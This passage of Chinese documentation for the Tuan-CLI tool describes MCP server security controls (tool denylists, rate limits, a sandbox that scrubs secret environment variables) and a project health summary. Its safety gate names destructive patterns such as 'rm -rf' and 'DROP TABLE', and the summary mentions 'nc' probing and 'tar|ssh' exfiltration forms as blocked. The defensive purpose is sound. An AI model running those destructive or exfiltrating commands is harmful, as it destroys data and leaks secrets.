        denied_tools:         # 黑名单模式: 禁止调用指定工具
          - delete_file
          - write_file
          - move_file
        require_confirm_tools: # 需要用户确认的工具
          - write_file
          - delete_file
```

### 11.2 频率限制 / 超时与重试

```yaml
mcp:
  security:
    max_calls_per_minute: 60  # 每分钟最多 60 次调用
    audit_enabled: true       # 启用审计日志
  timeout: 30.0               # 全局超时 (秒)
  servers:
    - name: filesystem
      command: npx
      args: ["-y", "@modelcontextprotocol/server-filesystem", "."]
      timeout: 10.0           # 服务器级超时
      max_retries: 3
      retry_delay: 1.0
```

查看审计日志：`/mcp audit 20`（显示最近 20 条调用记录）。

### 11.3 沙箱隔离（进程级，无需 Docker）

对不受信任的 MCP server，启用 `security.sandbox: true` 后执行**进程级隔离**：

1. **环境脱敏**：server 子进程的环境变量中抹除密钥类变量（`API_KEY`、`SECRET`、`TOKEN`、`PASSWORD`、`TUAN_*`、`OPENAI*`、`AWS_*`、`DATABASE_URL` 等），防止密钥泄漏到 server。
2. **工作目录隔离**：server 子进程运行在临时空目录，无法读写工作区文件。
3. **调用前 fail-closed 安全闸门**：每次工具调用前，参数中的文本字段经 safety 引擎红线检测，命中 `rm -rf`、`DROP TABLE` 等危险操作**直接拒绝**，不发送给 server；闸门异常时同样保守拒绝。

> **注**: 本沙箱为「最小隔离」纵深防御：防密钥泄漏、防读写工作区、防危险参数调用。
> 它不是操作系统级/容器级隔离——若需更强隔离，请在操作系统层自行限制（如容器、最小权限用户）。

### 11.4 查看安全状态与故障排查

```
/mcp security  # 显示所有服务器的安全策略
/mcp list      # 显示已连接的服务器
/mcp tools     # 显示可用工具
/mcp audit     # 显示调用审计日志
```

- 工具调用被拒绝 → 检查 `/mcp security`（是否在黑名单中，或不在白名单中）。
- 超过频率限制 → `tuan config set mcp.security.max_calls_per_minute 120`（重启后生效）。
- **注**: `/mcp config` 命令**不存在**。调整 MCP 配置请使用 `tuan config set <key> <value>`，或直接编辑 `~/.tuan/config.yaml` 的 `mcp:` 段。
- 沙箱执行失败 → 检查 server `command`/`args` 是否可执行（`tuan mcp list`）；闸门拦截是预期行为（查 `/mcp audit` 中 `sandbox-gate-denied` 记录）；密钥被抹除导致行为异常时请在 server 的 `env:` 段显式声明（仍建议最小必要权限）。

### 11.5 最佳实践

1. **最小权限原则**: 只授予必要的工具权限
2. **启用审计**: 始终启用审计日志以便排查问题
3. **设置频率限制**: 防止意外的高频调用
4. **使用沙箱**: 对不受信任的服务器启用沙箱隔离
5. **敏感工具确认**: 对修改类工具启用用户确认
6. **合理超时**: 设置适当的超时时间避免长时间阻塞

---

## 12. 健康状态摘要（2026-09-06 体检）

> 本节为全项目体检结论的持久化摘要（原详细报告已归档删除）。版本 `0.2.014`。

### 12.1 安全引擎对抗基准（1 万条，seed=20260906）

| 指标 | 结果 |
|------|------|
| 该拦召回（must-block） | **100%**（7360/7360） |
| 漏放（bypass） | **0**（修复前 44） |
| 误报 | **1.87%**（23 例，仅硬拦 1.38%） |
| 放行准确率 | 98.13% |
| 裸命令拦截 / 误杀 | 100% / 0 |

剩余 23 例误报为 fail-closed 保守取舍（`nc` 端口探测、`tar|ssh` 外传形态、含字面危险串），非缺陷。

### 12.2 测试套件

- 完整套件近次：**2560 passed / 10 failed / 8 skipped**，10 个失败全部为环境/IPC 类（全量长跑下 IPC 瞬断、`test_cli_e2e.py` CLI 入口夹具未装），非代码回归。
- 安全 / 安全相关测试 25 个文件整体复跑：**715 passed / 1 skipped**，安全引擎改动零回归。

### 12.3 已修复记录（2026-08-30 起）

| # | 缺陷 | 修复 |
|---|------|------|
| F1 | `pyproject.toml` 依赖清单缺失（pydantic/openai/typing_extensions/tomli/fastapi 等未声明） | 新增 `mcp`/`backend` optional-extras + `tomli; python<3.11` 条件依赖 |
| F2 | `doctor` 误判 openai 为必装 | openai 移入 optional 集合并改描述为「可选」 |
| F3 | `install.ps1` 解析到无 pip 的 uv 解释器装出废 venv | 探测「带 pip 的 python」+ `ensurepip` 引导 |
| F4 | `MCPPlugin._register_tool` 签名不一致 | 对齐实现与内部调用，`test_mcp_tool_bridge` PASS |
| F5 | Hooks 默认超时 5s 过紧，审计日志写不出 | `default_timeout` 5s → 30s |
| F6 | Hooks 超时强杀在 Windows 挂死 | 看门狗线程 + 进程树强杀（`taskkill /T` / `killpg`） |

### 12.4 待办（非阻塞，环境类）

- IPC 稳定性（进程/端口复用、引擎常驻连接池）：全量长跑偶发瞬断。
- `tests/test_cli_e2e.py` CLI 入口夹具：`_tuan_bin()` 解析的 `run` 控制台脚本不存在。

---

*最后修订：2026-09-06 · 适用于：Tuan-CLI 所有版本*